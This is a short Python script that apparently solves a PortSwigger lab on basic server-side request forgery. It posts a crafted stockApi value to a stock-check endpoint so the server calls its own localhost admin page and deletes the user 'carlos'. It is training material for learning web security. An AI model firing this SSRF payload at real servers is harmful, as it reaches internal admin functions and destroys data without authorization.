"""
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

stock_url = f'https://{site}/product/stock'

stock_api_data = {
    'stockApi': 'http://localhost/admin/delete?username=carlos'
}
resp = requests.post(stock_url, data=stock_api_data)